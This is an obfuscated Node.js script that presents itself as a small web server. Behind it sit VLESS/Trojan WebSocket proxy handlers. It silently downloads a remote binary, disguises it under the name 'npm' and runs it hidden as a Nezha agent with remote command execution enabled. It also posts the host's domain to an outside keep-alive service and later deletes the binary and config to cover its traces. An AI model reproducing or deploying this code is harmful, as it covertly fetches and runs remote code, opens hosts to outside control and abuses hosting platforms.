const _0x3dfec3=_0x5001;(function(_0x4a2d60,_0x279449){const _0x8a034e={_0x35c9fd:0x1d6,_0x54cdca:0x1e1,_0x74769c:0x182,_0x33846b:0x1d0,_0x4dd05b:0x183},_0x5bb4d0=_0x5001,_0x1bd0f0=_0x4a2d60();while(!![]){try{const _0x522e62=-parseInt(_0x5bb4d0(0x17b))/0x1+-parseInt(_0x5bb4d0(0x1e5))/0x2*(parseInt(_0x5bb4d0(_0x8a034e._0x35c9fd))/0x3)+parseInt(_0x5bb4d0(0x1a9))/0x4+parseInt(_0x5bb4d0(0x1db))/0x5+parseInt(_0x5bb4d0(_0x8a034e._0x54cdca))/0x6+-parseInt(_0x5bb4d0(0x1a2))/0x7*(-parseInt(_0x5bb4d0(_0x8a034e._0x74769c))/0x8)+parseInt(_0x5bb4d0(_0x8a034e._0x33846b))/0x9*(-parseInt(_0x5bb4d0(_0x8a034e._0x4dd05b))/0xa);if(_0x522e62===_0x279449)break;else _0x1bd0f0['push'](_0x1bd0f0['shift']());}catch(_0x35bf8c){_0x1bd0f0['push'](_0x1bd0f0['shift']());}}}(_0x1339,0x89830));function _0x5001(_0x1a9275,_0x32328a){const _0x133984=_0x1339();return _0x5001=function(_0x5001f3,_0xac3790){_0x5001f3=_0x5001f3-0x179;let _0xbb2314=_0x133984[_0x5001f3];return _0xbb2314;},_0x5001(_0x1a9275,_0x32328a);}function _0x1339(){const _0x102fab=['4085166jCiGOF','createHash','text/plain','crypto','2894IzSxPb','Server','--tls','error','Failed\x20to\x20resolve\x20','AUTO_ACCESS','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','finish','&type=A','post','find','https://oooo.serv00.net/add-url','hex','https://arm64.ssss.nyc.mn/v1','760242EwlqNB','test','NAME','false','update','aarch64','sha224','2528AfDeNb','1542230fnmOLb','connection','WSPATH','readFile','send','includes','createServer','replace','vless://','8443','Answer','catch','every','base64','2096','NEZHA_SERVER','https://api.ip.sb/geoip','arm','config.yaml','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','chmod\x20+x\x20npm','index.html','listen','get','once','Status','write','true','Not\x20Found\x0a','env','utf8','15680htMkaE','createWriteStream','&fp=chrome&type=ws&host=','Automatic\x20Access\x20Task\x20added\x20successfully','length','slice','npm\x20download\x20successfully','2160552YblDTu','toString','readUInt16BE','map','digest','setsid\x20nohup\x20./npm\x20-s\x20','443','buffer','npm\x20running\x20error:','concat','\x20with\x20all\x20DNS\x20servers','text/html','arch','readUInt8','npm','connect','/bin/bash','writeHead','application/dns-json','unlink','isp','log','axios','https://dns.google/resolve?name=','then','2083','&path=%2F','from','decode','UUID','Hello\x20world!','net','pipe','trim','1234.abc.com','url','end','message','07755e0e-42b4-4617-9e8b-7143dc420738','81SvcKLj','substr',':443?security=tls&sni=','error:\x20','2087','writeFileSync','519fWCVLN','child_process','join','data','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','5164945gPudtK','arm64','npm\x20is\x20already\x20running,\x20skip\x20running...','8.8.4.4','http','Server\x20is\x20running\x20on\x20port\x20'];_0x1339=function(){return _0x102fab;};return _0x1339();}const os=require('os'),http=require(_0x3dfec3(0x1df)),fs=require('fs'),axios=require(_0x3dfec3(0x1bf)),net=require(_0x3dfec3(0x1c8)),path=require('path'),crypto=require(_0x3dfec3(0x1e4)),{Buffer}=require(_0x3dfec3(0x1b0)),{exec,execSync}=require(_0x3dfec3(0x1d7)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3dfec3(0x1a0)][_0x3dfec3(0x1c6)]||_0x3dfec3(0x1cf),NEZHA_SERVER=process[_0x3dfec3(0x1a0)][_0x3dfec3(0x192)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3dfec3(0x1a0)]['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||_0x3dfec3(0x1cb),AUTO_ACCESS=process[_0x3dfec3(0x1a0)][_0x3dfec3(0x1ea)]||!![],WSPATH=process[_0x3dfec3(0x1a0)][_0x3dfec3(0x185)]||UUID[_0x3dfec3(0x1a7)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub',NAME=process[_0x3dfec3(0x1a0)][_0x3dfec3(0x17d)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1fa83={_0x3b344c:0x18a},_0x4cd73a=_0x3dfec3;try{const _0xf4c0bb=await axios[_0x4cd73a(0x19a)](_0x4cd73a(0x193)),_0x1d36d9=_0xf4c0bb[_0x4cd73a(0x1d9)];ISP=(_0x1d36d9['country_code']+'-'+_0x1d36d9[_0x4cd73a(0x1bd)])[_0x4cd73a(_0x1fa83._0x3b344c)](/ /g,'_');}catch(_0x31470e){ISP='Unknown';}};GetISP();const httpServer=http[_0x3dfec3(0x189)]((_0x41fca3,_0x57e750)=>{const _0x1e8d93={_0x39b414:0x1d8,_0x558a9b:0x198,_0x3bb502:0x1d2,_0x38603a:0x1c4,_0xc31c1f:0x1aa,_0x5495ba:0x190,_0x347e61:0x1cd,_0x1e5e3a:0x1e3,_0x363c76:0x1cd},_0x38a074={_0x1d12f4:0x1cd,_0x15e585:0x1c7,_0x4fbd76:0x1b4},_0x584f99=_0x3dfec3;if(_0x41fca3['url']==='/'){const _0x437df4=path[_0x584f99(_0x1e8d93._0x39b414)](__dirname,_0x584f99(_0x1e8d93._0x558a9b));fs[_0x584f99(0x186)](_0x437df4,_0x584f99(0x1a1),(_0x4ef82e,_0x475d43)=>{const _0x4f15fb=_0x584f99;if(_0x4ef82e){_0x57e750['writeHead'](0xc8,{'Content-Type':_0x4f15fb(0x1b4)}),_0x57e750[_0x4f15fb(_0x38a074._0x1d12f4)](_0x4f15fb(_0x38a074._0x15e585));return;}_0x57e750['writeHead'](0xc8,{'Content-Type':_0x4f15fb(_0x38a074._0x4fbd76)}),_0x57e750[_0x4f15fb(0x1cd)](_0x475d43);});return;}else{if(_0x41fca3[_0x584f99(0x1cc)]==='/'+SUB_PATH){const _0x5920f2=NAME?NAME+'-'+ISP:ISP,_0x3d2246=_0x584f99(0x18b)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x584f99(0x1a4)+DOMAIN+_0x584f99(0x1c3)+WSPATH+'#'+_0x5920f2,_0x30c12f='trojan://'+UUID+'@'+DOMAIN+_0x584f99(_0x1e8d93._0x3bb502)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x584f99(0x1c3)+WSPATH+'#'+_0x5920f2,_0x417e36=_0x3d2246+'\x0a'+_0x30c12f,_0x253845=Buffer[_0x584f99(_0x1e8d93._0x38603a)](_0x417e36)[_0x584f99(_0x1e8d93._0xc31c1f)](_0x584f99(_0x1e8d93._0x5495ba));_0x57e750['writeHead'](0xc8,{'Content-Type':_0x584f99(0x1e3)}),_0x57e750[_0x584f99(_0x1e8d93._0x347e61)](_0x253845+'\x0a');}else _0x57e750[_0x584f99(0x1ba)](0x194,{'Content-Type':_0x584f99(_0x1e8d93._0x1e5e3a)}),_0x57e750[_0x584f99(_0x1e8d93._0x363c76)](_0x584f99(0x19f));}}),wss=new WebSocket[(_0x3dfec3(0x1e6))]({'server':httpServer}),uuid=UUID[_0x3dfec3(0x18a)](/-/g,''),DNS_SERVERS=[_0x3dfec3(0x1de),'1.1.1.1'];function resolveHost(_0x109725){const _0x1de3eb={_0x13d2e4:0x17c},_0x1efcf5={_0x504674:0x1e9,_0x1496c8:0x1b3,_0x1b9564:0x1c1,_0x555ac7:0x18e};return new Promise((_0x157524,_0x4e1354)=>{const _0x5f1415=_0x5001;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5f1415(_0x1de3eb._0x13d2e4)](_0x109725)){_0x157524(_0x109725);return;}let _0x1723f4=0x0;function _0xb805db(){const _0x2307a7={_0x5abe29:0x18d},_0x5a98df=_0x5f1415;if(_0x1723f4>=DNS_SERVERS[_0x5a98df(0x1a6)]){_0x4e1354(new Error(_0x5a98df(_0x1efcf5._0x504674)+_0x109725+_0x5a98df(_0x1efcf5._0x1496c8)));return;}const _0x17296b=DNS_SERVERS[_0x1723f4];_0x1723f4++;const _0x216d2b=_0x5a98df(0x1c0)+encodeURIComponent(_0x109725)+_0x5a98df(0x1ed);axios['get'](_0x216d2b,{'timeout':0x1388,'headers':{'Accept':_0x5a98df(0x1bb)}})[_0x5a98df(_0x1efcf5._0x1b9564)](_0x593f55=>{const _0x55cfec=_0x5a98df,_0x8b6c5e=_0x593f55[_0x55cfec(0x1d9)];if(_0x8b6c5e[_0x55cfec(0x19c)]===0x0&&_0x8b6c5e[_0x55cfec(0x18d)]&&_0x8b6c5e[_0x55cfec(_0x2307a7._0x5abe29)]['length']>0x0){const _0x56bb4d=_0x8b6c5e['Answer'][_0x55cfec(0x1ef)](_0x540e6e=>_0x540e6e['type']===0x1);if(_0x56bb4d){_0x157524(_0x56bb4d['data']);return;}}_0xb805db();})[_0x5a98df(_0x1efcf5._0x555ac7)](_0x3cc317=>{_0xb805db();});}_0xb805db();});}function handleVlessConnection(_0x2b0407,_0x517ce7){const _0x408bff={_0x3669cd:0x1a7,_0x12be27:0x18f,_0x2533d1:0x1a7,_0xcd520a:0x1ab,_0x56bc46:0x1c5,_0x3e4657:0x1b6,_0x1646ea:0x1a7,_0x1add83:0x1ac,_0x574d18:0x1c1},_0x4fab69={_0x19941d:0x1e8},_0x4e151c={_0x169a18:0x1c9},_0x4ae4d1={_0x4f411c:0x1b8},_0x36c908=_0x3dfec3,[_0x3e2386]=_0x517ce7,_0x3584e8=_0x517ce7[_0x36c908(_0x408bff._0x3669cd)](0x1,0x11);if(!_0x3584e8[_0x36c908(_0x408bff._0x12be27)]((_0x26d880,_0x396aba)=>_0x26d880==parseInt(uuid[_0x36c908(0x1d1)](_0x396aba*0x2,0x2),0x10)))return![];let _0x474e86=_0x517ce7[_0x36c908(_0x408bff._0x2533d1)](0x11,0x12)[_0x36c908(0x1b6)]()+0x13;const _0x154aa8=_0x517ce7[_0x36c908(0x1a7)](_0x474e86,_0x474e86+=0x2)[_0x36c908(_0x408bff._0xcd520a)](0x0),_0x2b8ee4=_0x517ce7[_0x36c908(_0x408bff._0x2533d1)](_0x474e86,_0x474e86+=0x1)['readUInt8'](),_0x32db8b=_0x2b8ee4==0x1?_0x517ce7[_0x36c908(0x1a7)](_0x474e86,_0x474e86+=0x4)[_0x36c908(0x1d8)]('.'):_0x2b8ee4==0x2?new TextDecoder()[_0x36c908(_0x408bff._0x56bc46)](_0x517ce7[_0x36c908(0x1a7)](_0x474e86+0x1,_0x474e86+=0x1+_0x517ce7[_0x36c908(_0x408bff._0x3669cd)](_0x474e86,_0x474e86+0x1)[_0x36c908(_0x408bff._0x3e4657)]())):_0x2b8ee4==0x3?_0x517ce7[_0x36c908(_0x408bff._0x1646ea)](_0x474e86,_0x474e86+=0x10)['reduce']((_0x2aa0f1,_0x1d294c,_0x226750,_0x1f5137)=>_0x226750%0x2?_0x2aa0f1[_0x36c908(0x1b2)](_0x1f5137['slice'](_0x226750-0x1,_0x226750+0x1)):_0x2aa0f1,[])[_0x36c908(_0x408bff._0x1add83)](_0x22cb4e=>_0x22cb4e[_0x36c908(0x1ab)](0x0)[_0x36c908(0x1aa)](0x10))['join'](':'):'';_0x2b0407[_0x36c908(0x187)](new Uint8Array([_0x3e2386,0x0]));const _0x4a6f87=createWebSocketStream(_0x2b0407);return resolveHost(_0x32db8b)[_0x36c908(_0x408bff._0x574d18)](_0x19f0aa=>{const _0x48d864={_0x5b92a2:0x19d,_0x44694d:0x1e8,_0x2d8791:0x1c9},_0x2479de=_0x36c908;net[_0x2479de(_0x4ae4d1._0x4f411c)]({'host':_0x19f0aa,'port':_0x154aa8},function(){const _0x5e431b=_0x2479de;this[_0x5e431b(_0x48d864._0x5b92a2)](_0x517ce7['slice'](_0x474e86)),_0x4a6f87['on'](_0x5e431b(_0x48d864._0x44694d),()=>{})[_0x5e431b(0x1c9)](this)['on'](_0x5e431b(_0x48d864._0x44694d),()=>{})[_0x5e431b(_0x48d864._0x2d8791)](_0x4a6f87);})['on'](_0x2479de(0x1e8),()=>{});})[_0x36c908(0x18e)](_0xb75706=>{const _0x1120ed=_0x36c908;net['connect']({'host':_0x32db8b,'port':_0x154aa8},function(){const _0x61513f=_0x5001;this['write'](_0x517ce7['slice'](_0x474e86)),_0x4a6f87['on'](_0x61513f(0x1e8),()=>{})[_0x61513f(_0x4e151c._0x169a18)](this)['on'](_0x61513f(0x1e8),()=>{})[_0x61513f(0x1c9)](_0x4a6f87);})['on'](_0x1120ed(_0x4fab69._0x19941d),()=>{});}),!![];}function handleTrojanConnection(_0xe6eb1e,_0x1707ca){const _0xd952e9={_0xda3849:0x1a6,_0x23cd51:0x1e2,_0x4b356d:0x181,_0x6bf636:0x1ad,_0x273d41:0x179,_0x2950ed:0x1a7,_0x221bea:0x1a7,_0x35ecfd:0x1c1},_0x132839={_0x32e456:0x1e8},_0x587018={_0x25178a:0x1b8,_0x2719d2:0x1e8},_0x155fac={_0x2ee37d:0x1a7,_0x321a3e:0x1e8,_0x29ed69:0x1c9,_0x535ce3:0x1e8},_0x2bf288=_0x3dfec3;try{if(_0x1707ca[_0x2bf288(_0xd952e9._0xda3849)]<0x3a)return![];const _0x5cc03d=_0x1707ca[_0x2bf288(0x1a7)](0x0,0x38)['toString'](),_0x283c94=[UUID];let _0x5e629e=null;for(const _0x545d17 of _0x283c94){const _0x3ac5fa=crypto[_0x2bf288(_0xd952e9._0x23cd51)](_0x2bf288(_0xd952e9._0x4b356d))[_0x2bf288(0x17f)](_0x545d17)[_0x2bf288(_0xd952e9._0x6bf636)](_0x2bf288(_0xd952e9._0x273d41));if(_0x3ac5fa===_0x5cc03d){_0x5e629e=_0x545d17;break;}}if(!_0x5e629e)return![];let _0x36f0f6=0x38;_0x1707ca[_0x36f0f6]===0xd&&_0x1707ca[_0x36f0f6+0x1]===0xa&&(_0x36f0f6+=0x2);const _0xc97e86=_0x1707ca[_0x36f0f6];if(_0xc97e86!==0x1)return![];_0x36f0f6+=0x1;const _0x5b0912=_0x1707ca[_0x36f0f6];_0x36f0f6+=0x1;let _0x4c3e52,_0x1e34da;if(_0x5b0912===0x1)_0x4c3e52=_0x1707ca[_0x2bf288(_0xd952e9._0x2950ed)](_0x36f0f6,_0x36f0f6+0x4)[_0x2bf288(0x1d8)]('.'),_0x36f0f6+=0x4;else{if(_0x5b0912===0x3){const _0x47da15=_0x1707ca[_0x36f0f6];_0x36f0f6+=0x1,_0x4c3e52=_0x1707ca[_0x2bf288(_0xd952e9._0x221bea)](_0x36f0f6,_0x36f0f6+_0x47da15)[_0x2bf288(0x1aa)](),_0x36f0f6+=_0x47da15;}else{if(_0x5b0912===0x4)_0x4c3e52=_0x1707ca['slice'](_0x36f0f6,_0x36f0f6+0x10)['reduce']((_0x443365,_0x12c5d2,_0x28a851,_0x2f6ec5)=>_0x28a851%0x2?_0x443365[_0x2bf288(0x1b2)](_0x2f6ec5[_0x2bf288(0x1a7)](_0x28a851-0x1,_0x28a851+0x1)):_0x443365,[])['map'](_0x7adf46=>_0x7adf46[_0x2bf288(0x1ab)](0x0)[_0x2bf288(0x1aa)](0x10))[_0x2bf288(0x1d8)](':'),_0x36f0f6+=0x10;else return![];}}_0x1e34da=_0x1707ca[_0x2bf288(0x1ab)](_0x36f0f6),_0x36f0f6+=0x2;_0x36f0f6<_0x1707ca[_0x2bf288(0x1a6)]&&_0x1707ca[_0x36f0f6]===0xd&&_0x1707ca[_0x36f0f6+0x1]===0xa&&(_0x36f0f6+=0x2);const _0x220d54=createWebSocketStream(_0xe6eb1e);return resolveHost(_0x4c3e52)[_0x2bf288(_0xd952e9._0x35ecfd)](_0x556a65=>{const _0x33916a=_0x2bf288;net[_0x33916a(_0x587018._0x25178a)]({'host':_0x556a65,'port':_0x1e34da},function(){const _0x402499=_0x33916a;_0x36f0f6<_0x1707ca[_0x402499(0x1a6)]&&this[_0x402499(0x19d)](_0x1707ca[_0x402499(_0x155fac._0x2ee37d)](_0x36f0f6)),_0x220d54['on'](_0x402499(_0x155fac._0x321a3e),()=>{})[_0x402499(_0x155fac._0x29ed69)](this)['on'](_0x402499(_0x155fac._0x535ce3),()=>{})['pipe'](_0x220d54);})['on'](_0x33916a(_0x587018._0x2719d2),()=>{});})['catch'](_0x4f48b8=>{const _0x660d70={_0x41eeca:0x1e8},_0x56255=_0x2bf288;net['connect']({'host':_0x4c3e52,'port':_0x1e34da},function(){const _0x325259=_0x5001;_0x36f0f6<_0x1707ca[_0x325259(0x1a6)]&&this[_0x325259(0x19d)](_0x1707ca['slice'](_0x36f0f6)),_0x220d54['on']('error',()=>{})['pipe'](this)['on'](_0x325259(_0x660d70._0x41eeca),()=>{})[_0x325259(0x1c9)](_0x220d54);})['on'](_0x56255(_0x132839._0x32e456),()=>{});}),!![];}catch(_0x167bb3){return![];}}wss['on'](_0x3dfec3(0x184),(_0x43adb1,_0x4275f6)=>{const _0x404f7e={_0x362b8a:0x19b,_0x1911b7:0x1e8},_0x2a52e3={_0x13c05d:0x18f},_0x153635=_0x3dfec3,_0x5df0f0=_0x4275f6['url']||'';_0x43adb1[_0x153635(_0x404f7e._0x362b8a)](_0x153635(0x1ce),_0xaab98b=>{const _0x42a722=_0x153635;if(_0xaab98b[_0x42a722(0x1a6)]>0x11&&_0xaab98b[0x0]===0x0){const _0x3a913f=_0xaab98b[_0x42a722(0x1a7)](0x1,0x11),_0x516600=_0x3a913f[_0x42a722(_0x2a52e3._0x13c05d)]((_0x7d0038,_0x470b0d)=>_0x7d0038==parseInt(uuid['substr'](_0x470b0d*0x2,0x2),0x10));if(_0x516600){!handleVlessConnection(_0x43adb1,_0xaab98b)&&_0x43adb1['close']();return;}}!handleTrojanConnection(_0x43adb1,_0xaab98b)&&_0x43adb1['close']();})['on'](_0x153635(_0x404f7e._0x1911b7),()=>{});});const getDownloadUrl=()=>{const _0x421ca2={_0xe04d18:0x1b5,_0xa503b3:0x194,_0x4433ff:0x1dc},_0x517f6a=_0x3dfec3,_0x1761fb=os[_0x517f6a(_0x421ca2._0xe04d18)]();return _0x1761fb===_0x517f6a(_0x421ca2._0xa503b3)||_0x1761fb===_0x517f6a(_0x421ca2._0x4433ff)||_0x1761fb===_0x517f6a(0x180)?!NEZHA_PORT?_0x517f6a(0x17a):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x1337b4={_0x412eda:0x19a,_0x20b81a:0x1d9,_0x1abd2d:0x1c9},_0x2b5bde={_0x170b45:0x1ec},_0x3bcb01={_0x507700:0x1be,_0x241416:0x1a8},_0x143ceb=_0x3dfec3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xa1d4d3=getDownloadUrl(),_0x22e5b5=await axios({'method':_0x143ceb(_0x1337b4._0x412eda),'url':_0xa1d4d3,'responseType':'stream'}),_0x2721b3=fs[_0x143ceb(0x1a3)]('npm');return _0x22e5b5[_0x143ceb(_0x1337b4._0x20b81a)][_0x143ceb(_0x1337b4._0x1abd2d)](_0x2721b3),new Promise((_0x5d42d0,_0x2ddd21)=>{const _0x25fd39=_0x143ceb;_0x2721b3['on'](_0x25fd39(_0x2b5bde._0x170b45),()=>{const _0xd114f=_0x25fd39;console[_0xd114f(_0x3bcb01._0x507700)](_0xd114f(_0x3bcb01._0x241416)),exec(_0xd114f(0x197),_0x11dcb4=>{if(_0x11dcb4)_0x2ddd21(_0x11dcb4);_0x5d42d0();});}),_0x2721b3['on']('error',_0x2ddd21);});}catch(_0x4f268d){throw _0x4f268d;}},runnz=async()=>{const _0x5559c3={_0x3e0af3:0x1da,_0x5da916:0x1dd,_0x297b04:0x18c,_0x5314f4:0x191,_0x56e4e5:0x188,_0x4e05d0:0x1e7,_0x13af19:0x1ae,_0x3eb31a:0x19e,_0x2ef565:0x1eb},_0x31fd24={_0x151c9a:0x1b1},_0x336059=_0x3dfec3;try{const _0x140eb4=execSync(_0x336059(_0x5559c3._0x3e0af3),{'encoding':'utf-8'});if(_0x140eb4[_0x336059(0x1ca)]()!==''){console[_0x336059(0x1be)](_0x336059(_0x5559c3._0x5da916));return;}}catch(_0xf05bb7){}await downloadFile();let _0x215cce='',_0x483b8d=[_0x336059(0x1af),_0x336059(_0x5559c3._0x297b04),_0x336059(_0x5559c3._0x5314f4),_0x336059(0x1d4),_0x336059(0x1c2),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x25c40b=_0x483b8d[_0x336059(_0x5559c3._0x56e4e5)](NEZHA_PORT)?_0x336059(_0x5559c3._0x4e05d0):'';_0x215cce=_0x336059(_0x5559c3._0x13af19)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x25c40b+_0x336059(0x196);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b8df2=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x466b78=_0x483b8d[_0x336059(0x188)](_0x2b8df2)?_0x336059(_0x5559c3._0x3eb31a):_0x336059(0x17e),_0x5ca593='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x336059(_0x5559c3._0x2ef565)+_0x466b78+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x336059(0x1d5)](_0x336059(0x195),_0x5ca593);}_0x215cce='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x215cce,{'shell':_0x336059(0x1b9)},_0xaf188a=>{const _0x27c3a5=_0x336059;if(_0xaf188a)console['error'](_0x27c3a5(_0x31fd24._0x151c9a),_0xaf188a);else console['log']('npm\x20is\x20running');});}catch(_0x1b7dfd){console[_0x336059(0x1e8)](_0x336059(0x1d3)+_0x1b7dfd);}};async function addAccessTask(){const _0x48ba12={_0x1506be:0x1ee,_0x2f307b:0x1f0,_0x25c7d0:0x1be},_0x1592ca=_0x3dfec3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5f9f60='https://'+DOMAIN;try{const _0x40d192=await axios[_0x1592ca(_0x48ba12._0x1506be)](_0x1592ca(_0x48ba12._0x2f307b),{'url':_0x5f9f60},{'headers':{'Content-Type':'application/json'}});console[_0x1592ca(_0x48ba12._0x25c7d0)](_0x1592ca(0x1a5));}catch(_0x5aafa4){}}const delFiles=()=>{const _0x119606={_0x62fcec:0x1bc},_0x528d55=_0x3dfec3;fs['unlink'](_0x528d55(0x1b7),()=>{}),fs[_0x528d55(_0x119606._0x62fcec)]('config.yaml',()=>{});};httpServer[_0x3dfec3(0x199)](PORT,()=>{const _0x285317=_0x3dfec3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x285317(0x1be)](_0x285317(0x1e0)+PORT);});
